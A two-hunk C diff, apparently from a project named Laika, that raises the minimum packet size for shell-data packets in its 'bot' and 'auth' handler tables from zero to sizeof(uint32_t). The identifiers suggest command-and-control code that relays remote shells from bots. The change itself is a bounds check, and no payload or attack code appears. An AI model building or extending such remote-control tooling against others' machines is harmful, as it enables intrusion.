@@ -128,7 +128,7 @@ struct sLaika_peerPacketInfo laikaC_botPktTbl[LAIKAPKT_MAXNONE] = {
     false),
     LAIKA_CREATE_PACKET_INFO(LAIKAPKT_SHELL_DATA,
         laikaC_handleShellData,
-        0,
+        sizeof(uint32_t), /* packet must be bigger than this */
     true),
 };
 
@@ -144,7 +144,7 @@ struct sLaika_peerPacketInfo laikaC_authPktTbl[LAIKAPKT_MAXNONE] = {
     false),
     LAIKA_CREATE_PACKET_INFO(LAIKAPKT_SHELL_DATA,
         laikaC_handleAuthenticatedShellData,
-        0,
+        sizeof(uint32_t), /* packet must be bigger than this */
     true),
 };
 
